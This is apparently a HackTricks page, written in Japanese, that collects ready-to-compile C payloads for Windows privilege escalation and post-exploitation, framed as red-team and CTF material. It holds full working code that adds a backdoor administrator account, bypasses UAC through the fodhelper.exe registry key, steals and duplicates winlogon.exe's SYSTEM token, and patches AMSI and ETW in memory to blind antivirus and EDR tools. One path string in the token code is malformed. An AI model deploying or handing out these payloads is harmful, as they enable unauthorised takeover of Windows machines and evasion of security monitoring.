# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

このページでは、Windowsのローカル特権昇格やポストエクスプロイト中に便利な**小さく、自己完結したCスニペット**を集めています。各ペイロードは**コピー＆ペーストしやすい**ように設計されており、Windows API / Cランタイムのみを必要とし、`i686-w64-mingw32-gcc` (x86) または `x86_64-w64-mingw32-gcc` (x64) でコンパイルできます。

> ⚠️  これらのペイロードは、プロセスがアクションを実行するために必要な最小限の特権（例：`SeDebugPrivilege`、`SeImpersonatePrivilege`、またはUACバイパスのための中程度の整合性コンテキスト）をすでに持っていることを前提としています。これらは、脆弱性を悪用して任意のネイティブコード実行が可能な**レッドチームまたはCTF設定**を目的としています。

---

## Add local administrator user
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UACバイパス – `fodhelper.exe` レジストリハイジャック (中 → 高整合性)
信頼されたバイナリ **`fodhelper.exe`** が実行されると、以下のレジストリパスを **`DelegateExecute` 動詞をフィルタリングせずに** クエリします。このキーの下にコマンドを植え付けることで、攻撃者はファイルをディスクに落とすことなくUACをバイパスできます。

*`fodhelper.exe` によってクエリされたレジストリパス*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
最小限のPoCで、昇格された`cmd.exe`をポップします：
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2およびWindows 11 23H2（2025年7月のパッチ）でテスト済み。バイパスはまだ機能します。なぜなら、Microsoftは`DelegateExecute`パスの欠落した整合性チェックを修正していないからです。*

---

## トークン複製によるSYSTEMシェルの生成（`SeDebugPrivilege` + `SeImpersonatePrivilege`）
現在のプロセスが**両方**の`SeDebug`および`SeImpersonate`特権を保持している場合（多くのサービスアカウントに典型的）、`winlogon.exe`からトークンを盗み、それを複製して昇格したプロセスを開始できます：
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
For a deeper explanation of how that works see:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## インメモリ AMSI & ETW パッチ (防御回避)
ほとんどの現代の AV/EDR エンジンは、悪意のある動作を検査するために **AMSI** と **ETW** に依存しています。現在のプロセス内で両方のインターフェースを早期にパッチすることで、スクリプトベースのペイロード（例：PowerShell、JScript）がスキャンされるのを防ぎます。
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*上記のパッチはプロセスローカルであり、それを実行した後に新しいPowerShellを起動すると、AMSI/ETW検査なしで実行されます。*

---

## 参考文献
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
